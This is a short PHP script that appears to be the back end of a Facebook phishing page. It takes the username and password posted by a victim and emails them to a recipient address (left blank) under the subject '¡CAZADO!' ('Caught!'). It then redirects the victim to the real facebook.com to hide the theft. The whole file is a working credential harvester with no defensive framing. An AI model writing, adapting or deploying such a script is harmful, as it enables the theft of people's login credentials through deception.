<?php
$nombre = $_POST['user'];
$contraseña = $_POST['password'];

ini_set('display_errors', 1 );
error_reporting(E_ALL);
$from = "";
$to = "";
$subject = "¡CAZADO!";
$message = "usuario=".$nombre."contraseña".$contraseña."";
$headers = "From" . $from;
mail($to,$subject,$message,$headers);

header('Location: https://www.facebook.com/');


?>